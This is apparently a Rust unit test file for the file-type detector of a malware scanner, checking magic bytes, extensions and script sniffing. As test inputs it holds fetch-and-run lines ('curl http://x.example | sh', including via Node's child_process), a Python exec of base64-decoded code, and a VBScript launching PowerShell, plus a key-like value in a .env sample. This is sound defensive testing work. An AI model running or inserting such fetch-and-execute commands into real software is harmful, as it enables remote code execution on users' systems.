#![allow(clippy::unwrap_used)]

use super::*;
use std::path::Path;

#[test]
fn bridge_path_detection() {
    assert_eq!(declared_file_type(Path::new("script.py")), FileType::Python);
    assert_eq!(
        declared_file_type(Path::new("app.js")),
        FileType::JavaScript
    );
    assert_eq!(
        declared_file_type(Path::new("Component.jsx")),
        FileType::JavaScript
    );
    assert_eq!(declared_file_type(Path::new("data.xyz")), FileType::Unknown);
    assert_eq!(declared_file_type(Path::new("page.html")), FileType::Html);
    assert_eq!(
        declared_file_type(Path::new("evil.service")),
        FileType::SystemdService
    );
    assert_eq!(
        declared_file_type(Path::new("README.md")),
        FileType::Markdown
    );
    assert_eq!(declared_file_type(Path::new("notes.txt")), FileType::Text);
    assert_eq!(
        declared_file_type(Path::new("Makefile")),
        FileType::Makefile
    );
    assert_eq!(
        declared_file_type(Path::new("rules.mk")),
        FileType::Makefile
    );
}

#[test]
fn bridge_magic_detection() {
    let elf = b"\x7fELF\x02\x01\x01\x00";
    assert_eq!(file_type(Path::new("bin"), elf), FileType::Elf);

    // `MZ` with no image behind it is not a PE (filefacts' PE gate); its
    // bytes are still analyzed, as data.
    let pe = [b'M', b'Z', 0x90, 0x00, 0x03, 0x00, 0x00, 0x00];
    assert_eq!(file_type(Path::new("a.exe"), &pe), FileType::Data);

    let pyc = [0x55, 0x0d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00];
    assert_eq!(
        file_type(Path::new("c/s.dat"), &pyc),
        FileType::PythonBytecode
    );
}

#[test]
fn bridge_pe_magic_requires_valid_nt_header() {
    let mut pe = vec![0u8; 0x84];
    pe[0..2].copy_from_slice(b"MZ");
    pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
    pe[0x80..0x84].copy_from_slice(b"PE\0\0");
    assert_eq!(file_type(Path::new("a.exe"), &pe), FileType::Pe);

    assert_eq!(
        file_type(Path::new("BOUT.inp"), b"MZ = 8    # Z size\n"),
        FileType::Text
    );
}

#[test]
fn bridge_shebang() {
    assert_eq!(
        file_type(Path::new("s"), b"#!/bin/bash\necho hi\n"),
        FileType::Shell,
    );
}

#[test]
fn bridge_extension_fallback() {
    assert_eq!(
        file_type(Path::new("app.js"), b"x = 1\n"),
        FileType::JavaScript
    );
}

#[test]
fn bridge_unknown() {
    // Unknown extension with no magic match falls through to Unknown.
    assert_eq!(
        file_type(Path::new("d.xyz"), &[0, 0, 0, 0]),
        FileType::Unknown
    );
}

#[test]
fn bridge_data_extension() {
    // Opaque binary extensions (.bin/.dat/.payload/.raw) map to Data so
    // the generic analyzer runs string extraction and data-file rules.
    assert_eq!(file_type(Path::new("d.bin"), &[0, 0, 0, 0]), FileType::Data);
    assert_eq!(
        file_type(Path::new("Canon.dat"), &[0, 0, 0, 0]),
        FileType::Data
    );
}

#[test]
fn bridge_source_map_extension_is_analyzable_data() {
    let encoded = b"data:application/javascript;base64,Y29uc3QgYSAgPSAxOw==";
    assert_eq!(
        file_type(Path::new("package/parse.ts.map"), encoded),
        FileType::Data
    );
}

#[test]
fn bridge_html_requires_content() {
    assert_eq!(
        file_type(Path::new("p.html"), b"<html><body>hi</body></html>"),
        FileType::Html
    );
    assert_eq!(
        file_type(Path::new("p.html"), b"just text"),
        FileType::Unknown
    );
}

#[test]
fn bridge_yaml() {
    // YAML used to bridge to Unknown because filefacts had no type for it,
    // which meant cleave skipped every config it could not otherwise
    // identify. It now carries a type of its own.
    assert_eq!(
        file_type(Path::new("c.yaml"), b"name: test\n"),
        FileType::Yaml
    );
    // A workflow still refines past generic YAML.
    assert_eq!(
        file_type(
            Path::new("ci.yml"),
            b"name: CI\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
        ),
        FileType::GithubActions
    );
}

#[test]
fn bridge_ooxml() {
    // An Office extension is believed only when the bytes back it up:
    // every OOXML document is an OPC package and names
    // `[Content_Types].xml` as its first entry. A zip that merely carries
    // the extension is a zip, and is walked as one -- which is what lets
    // its members be analyzed at all.
    let mut package = b"PK\x03\x04".to_vec();
    package.extend_from_slice(&[0u8; 22]);
    package.extend_from_slice(&19u16.to_le_bytes());
    package.extend_from_slice(&0u16.to_le_bytes());
    package.extend_from_slice(b"[Content_Types].xml");
    assert_eq!(file_type(Path::new("s.pptx"), &package), FileType::Ooxml);

    let mut bare = b"PK\x03\x04".to_vec();
    bare.resize(12, 0);
    assert_eq!(file_type(Path::new("s.pptx"), &bare), FileType::Zip);
}

#[test]
fn bridge_heuristic_python() {
    let data = b"import os\nimport sys\ndef main():\n    print(\x27hello\x27)\n";
    assert_eq!(file_type(Path::new("script"), data), FileType::Python);
}

#[test]
fn bridge_heuristic_utf16le_vbscript_without_extension() {
    let script = "On Error Resume Next\r\nSet sh = CreateObject(\"WScript.Shell\")\r\nself = WScript.ScriptFullName\r\nFunction repl(x)\r\nrepl = Replace(x, \"a\", \"\")\r\nEnd Function\r\nsh.Run \"powershell -command echo ok\", 0, true\r\n";
    let data = script
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect::<Vec<_>>();
    assert_eq!(file_type(Path::new("payload"), &data), FileType::Vbs);
}

/// The sniff's contract: distinct-marker counting (not occurrence
/// counting), both encodings, and a size cap that keeps generic markers
/// scattered across a large binary from adding up to a script verdict.
#[test]
fn script_sniff_counts_distinct_markers_in_either_encoding() {
    let vbs = b"Set sh = CreateObject(\"WScript.Shell\")\r\nsh.Run \"calc\", 0\r\n";
    assert_eq!(sniff_script(vbs), Some(FileType::Vbs));

    let wide: Vec<u8> = String::from_utf8_lossy(vbs)
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect();
    assert_eq!(sniff_script(&wide), Some(FileType::Vbs));

    let mut compiled_rules = b"YARA-X\0\0\x02\0\0\0".to_vec();
    compiled_rules.extend_from_slice(vbs);
    assert_eq!(sniff_script(&compiled_rules), None);

    // One marker repeated is one marker, not three.
    assert_eq!(
        sniff_script(b"createobject( createobject( createobject("),
        None
    );

    // `end function` must not consume the `function ` inside it: with
    // non-overlapping matching this pair plus `.run ` would count 2, not 3.
    assert_eq!(
        sniff_script(b"End Function (x)\r\nsh.Run \"x\"\r\n"),
        Some(FileType::Vbs)
    );

    // The dmg case: the three generic markers, far apart, in a blob larger
    // than any delivered script. Size is the *only* difference between
    // these two — same markers, same spacing, one over the cap.
    let planted = |len: usize| {
        let mut blob = vec![b'\n'; len];
        let step = len / 4;
        blob[step..step + 9].copy_from_slice(b"function ");
        blob[2 * step..2 * step + 12].copy_from_slice(b"end function");
        blob[3 * step..3 * step + 5].copy_from_slice(b".run ");
        blob
    };
    assert_eq!(sniff_script(&planted(1024 * 1024)), Some(FileType::Vbs));
    assert_eq!(sniff_script(&planted(6 * 1024 * 1024)), None);
}

#[test]
fn bridge_known_toml_manifests_by_basename() {
    assert_eq!(
        declared_file_type(Path::new("Cargo.toml")),
        FileType::CargoToml
    );
    assert_eq!(
        file_type(Path::new("nested/Cargo.toml"), b"[package]\nname='x'\n"),
        FileType::CargoToml
    );
    assert_eq!(
        file_type(Path::new("pyproject.toml"), b"[project]\nname='x'\n"),
        FileType::PyProjectToml
    );
    assert_eq!(
        file_type(Path::new("config.toml"), b"[package]\nname='x'\n"),
        FileType::Text
    );
}

#[test]
fn bridge_dotenv_files_are_text() {
    assert_eq!(declared_file_type(Path::new(".env")), FileType::Text);
    assert_eq!(
        file_type(Path::new(".env"), b"API_KEY=abc123\n"),
        FileType::Text
    );
    assert_eq!(
        declared_file_type(Path::new(".env.backup.20260617_154013")),
        FileType::Text
    );
    assert_eq!(
        file_type(
            Path::new(".env.backup.20260617_154013"),
            b"CLOUDFLOW_CENTER_API_KEY=7e83812d309d3954a6fcdc5482aca2da73125828ab0d1e4a781e30404a718cfe\n"
        ),
        FileType::Text
    );
}

#[test]
fn binaries_named_like_text_keep_their_content_type() {
    let elf = b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x02\0\x3e\0\x01\0\0\0";
    let zip = b"PK\x03\x04\x14\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
    for name in [".env", ".env.backup", ".PKGINFO", "setup.rsc"] {
        assert_ne!(
            file_type(Path::new(name), elf),
            FileType::Text,
            "ELF named {name}"
        );
        assert_ne!(
            file_type(Path::new(name), zip),
            FileType::Text,
            "zip named {name}"
        );
    }
    assert_eq!(
        file_type(Path::new(".env"), b"API_KEY=abc123\n"),
        FileType::Text
    );
}

/// A name that means "inert text" is the caller's to choose, so it must
/// not hide code: a payload named `.env`, `.PKGINFO` or `x.rsc` is typed
/// by its content, exactly as it would be under any other name.
#[test]
fn scripts_named_like_text_keep_their_content_type() {
    let js = b"const cp = require('child_process');\ncp.execSync('curl http://x.example | sh');\nmodule.exports = {};\n";
    let py = b"import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n";
    let sh = b"#!/bin/sh\ncurl -s http://x.example | sh\n";
    for name in [
        ".env",
        ".env.backup",
        ".PKGINFO",
        ".BUILDINFO",
        ".MTREE",
        "setup.rsc",
    ] {
        for (payload, expected) in [
            (js.as_slice(), file_type(Path::new("plain"), js)),
            (py.as_slice(), file_type(Path::new("plain"), py)),
            (sh.as_slice(), file_type(Path::new("plain"), sh)),
        ] {
            assert_ne!(expected, FileType::Text);
            assert_eq!(
                file_type(Path::new(name), payload),
                expected,
                "payload named {name}"
            );
        }
    }
}

#[test]
fn bridge_arch_package_metadata_stays_text() {
    assert_eq!(declared_file_type(Path::new(".PKGINFO")), FileType::Text);
    assert_eq!(
        file_type(
            Path::new(".PKGINFO"),
            b"pkgdesc = Tools to package up Wasm Components\n"
        ),
        FileType::Text
    );
    assert_eq!(
        file_type(Path::new(".BUILDINFO"), b"format = 2\n"),
        FileType::Text
    );
    assert_eq!(file_type(Path::new(".MTREE"), b"#mtree\n"), FileType::Text);
}
